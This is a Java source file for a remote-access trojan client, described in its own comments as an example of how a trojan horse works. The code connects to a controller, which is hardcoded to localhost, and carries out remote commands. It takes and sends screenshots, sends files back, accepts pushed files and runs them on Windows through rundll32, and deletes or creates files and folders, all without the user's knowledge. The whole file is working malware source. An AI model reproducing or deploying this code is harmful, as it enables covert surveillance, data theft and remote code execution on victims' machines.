import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;

/**
 * Created by pontu on 2018-02-19.
 */

/*
The trojan horse client class
This is a small example of how a trojan horse could work.
it allows the trojan horse controller to sent commands to this trojan horse client that is constantly just
waiting for orders.
The trojan horse controller can for example:
Retrieve files, send files, execute files (windows) change directory, create files, delete files,
delete directories.
But because the trojan controller can push send files and execute them without the clients
knowledge, anything is possible.

This class initiates all the sockets and streams.
 */
public class THClient {
    private Socket socket;
    private String currentDirectory = System.getProperty("user.dir");
    private Reply reply;
    private ObjectOutputStream oos;
    THClient(String server, int port) {
        initiateConnection(server, port);
    }

    /*
    Method for initiating the connection.
    Sets up the sockets and the output and creates a reply instance
    that will constantly be listening to the trojan horse for commands.
     */
    private void initiateConnection(String server, int port) {
        setUpSocket(server, port);
        setUpOutput();
        reply = new Reply(socket, this);
    }

    /*
    Method for setting up the sockets.
     */
    public void setUpSocket(String ip, int port) {
        try {
            InetAddress host = InetAddress.getByName(ip);
            socket = new Socket(host, port);
            System.out.println("connected to IP: " + host.getHostAddress() + " at port: " + port);
        } catch (Exception ex) {
            System.out.println("Socket could not be created");
        }
    }

    /*
    Method for setting up the object output stream
     */
    public void setUpOutput() {
        try {
            oos = new ObjectOutputStream(socket.getOutputStream());
        } catch (Exception ex) {
            System.out.println("Could not setup input and output streams");
        }
    }

    /*
    Method for dealing with commands received by the trojan controller
     */
    public void dealWithCommand(String commandString) {
        String command;
        if(commandString.contains(" ")) {
            command = commandString.substring(0, commandString.indexOf(" "));
            commandString = commandString.substring(commandString.indexOf(" ") + 1, commandString.length());
        }else{
            command = commandString;
        }
        switch(command) {
            case "touch":
                createTextFile(commandString);
                break;
            case "mkdir":
                createDirectory(commandString);
                break;
            case "ls":
                listFilesAndFolders();
                break;
            case "cd":
                changeDirectory(commandString);
                break;
            case "rm":
                deleteFileOrDirectory(commandString);
                break;
            case "run":
                executeFile(commandString);
                break;
            case "push":
                transferFile(commandString);
                break;
            case "get":
                retrieveFile(commandString);
                break;
            case "screen":
                printScreen(commandString);
                break;
        }
    }

    /*
    Method to print the screen and send it to the trojan controller.
     */
    private void printScreen(String commandString) {
        try {
            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write( image, "png", baos );
            baos.flush();
            byte[] imageInByte = baos.toByteArray();
            baos.close();
            Storage storage = new Storage("screenshot", imageInByte);
            oos.writeObject(storage);
            oos.flush();
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method for transferring a file to the trojan controller.
     */
    private void transferFile(String commandString) {
        Storage stored = reply.getStored();
        try {
            if(!getFile(commandString).exists()) {
                FileOutputStream fos = new FileOutputStream(getFile(commandString));
                fos.write(stored.getData());
                fos.close();
                Storage storage = new Storage(commandString + " has been transfered!\n");
                oos.writeObject(storage);
                oos.flush();
            }else{
                Storage storage = new Storage("Can not transfer. File already exists.\n");
                oos.writeObject(storage);
                oos.flush();
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method for executing a file on a windows computer.
     */
    private void executeFile(String commandString) {
        try {
            File fileToRun = getFile(commandString);
            if(fileToRun.exists()) {
                Process p = Runtime.getRuntime().exec("rundll32 SHELL32.DLL,ShellExec_RunDLL " + fileToRun.getAbsolutePath());
                p.waitFor();
                Storage storage = new Storage("File has been run.\n");
                oos.writeObject(storage);
                oos.flush();
            }else {
                Storage storage = new Storage("Can not run. File does not exist\n");
                oos.writeObject(storage);
                oos.flush();
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method to retrieve a file and send it to the trojan controller using
    the input stream reader and object output stream.
     */
    private void retrieveFile(String commandString) {
        try {
            File file = getFile(commandString);
            if(file.exists()) {
                byte[] fileArray = new byte[(int) file.length()];
                FileInputStream fileInputStream = new FileInputStream(file);
                fileInputStream.read(fileArray);
                fileInputStream.close();

                Storage objectToSend = new Storage(commandString, fileArray);
                oos.writeObject(objectToSend);
                oos.flush();
            }else{
                Storage storage = new Storage("Can not retrieve file. File does not exist!\n");
                oos.writeObject(storage);
                oos.flush();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method used to delete a file or directory on the client computer from
    command by trojan controller.
     */
    private void deleteFileOrDirectory(String commandString) {
        try {
            File fileToDelete = getFile(commandString);
            if(fileToDelete.isDirectory() && fileToDelete.listFiles().length != 0){
              Storage storage = new Storage("Can not delete. Folder is not empty!\n");
              oos.writeObject(storage);
              oos.flush();
            } else if(fileToDelete.exists()) {
                Path filePath = Paths.get(fileToDelete.getAbsolutePath());
                Files.delete(filePath);
                Storage storage = new Storage(commandString + " has been deleted!\n");
                oos.writeObject(storage);
                oos.flush();
            }else{
                Storage storage = new Storage("Can not delete. File does not exist!\n");
                oos.writeObject(storage);
                oos.flush();
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method to list all the files and folder to the trojan controller by sending them as
    a string.
     */
    private void listFilesAndFolders() {
        try {
            File currentFolder = getFile("");
            File[] fileArray = currentFolder.listFiles();
            String filesAndFoldersString = currentDirectory + "\n";
            if(fileArray != null && fileArray.length > 0) {
                for (File file : fileArray) {
                    filesAndFoldersString += file.getName() + "\n";
                }
            }
            Storage storage = new Storage(filesAndFoldersString);
            oos.writeObject(storage);
            oos.flush();
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method used so that the trojan controller can change the current folder that its
    looking at to see whats in another folder.
     */
    private void changeDirectory(String commandString) {
        try {
            File folder = getFile(commandString);
            if (folder.exists() && folder.isDirectory()) {
                currentDirectory = folder.getAbsolutePath();
                Storage storage = new Storage(folder.getAbsolutePath() + "\n");
                oos.writeObject(storage);
                oos.flush();
            } else {
                Storage storage = new Storage("No such directory!\n");
                oos.writeObject(storage);
                oos.flush();
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method to enable to trojan controller to create a new folder on the
    clients computer.
     */
    private void createDirectory(String commandString) {
        try {
            File dirFile = getFile(commandString);
            if(!dirFile.exists()) {
                dirFile.mkdir();
                Storage storage = new Storage("Directory: " + commandString + " created!\n");
                oos.writeObject(storage);
                oos.flush();
            }else{
                Storage storage = new Storage("Directory already exists!\n");
                oos.writeObject(storage);
                oos.flush();
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method to enable to trojan controller to create a text file on the clients computer.
     */
    private void createTextFile(String commandString) {
        try {
            String pathString = commandString.substring(0, commandString.indexOf(" ")) + ".txt";
            commandString = commandString.substring(commandString.indexOf(" ") + 1, commandString.length());
            ArrayList<String> text = new ArrayList<>();
            text.add(commandString);
            File newFile = getFile(pathString);
            if(!newFile.exists()) {
                Path newPath = Paths.get(newFile.getAbsolutePath());
                Files.write(newPath, text, Charset.forName("UTF-8"));
                Storage storage = new Storage("Text file: " + commandString + " created!\n");
                oos.writeObject(storage);
                oos.flush();
            }else {
                Storage storage = new Storage("Text file with that name already exists!\n");
                oos.writeObject(storage);
                oos.flush();
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Support method used to get a file.
     */
    private File getFile(String commandString) {
        File dirFile;
        if(commandString.contains(":")) {
            dirFile = new File(commandString);
        }else if(commandString.equals("..")) {
            String path;
            if(currentDirectory.indexOf("\\") != currentDirectory.lastIndexOf("\\")) {
                path = currentDirectory.substring(0, currentDirectory.lastIndexOf("\\"));
            } else {
                path = currentDirectory.substring(0, currentDirectory.lastIndexOf("\\") + 1);
            }
            dirFile = new File(path);
        }else {
            dirFile = new File(currentDirectory + "\\" + commandString);
        }
        return dirFile;
    }

    /*
    main method used to initiate the client, hard coded ip and port ensures that the client
    will always be communicating with a controller on a specified ip.
     */
    public static void main(String[] args) {
        //hardcode the address and port
        THClient thc = new THClient("localhost", 19999);
    }
}
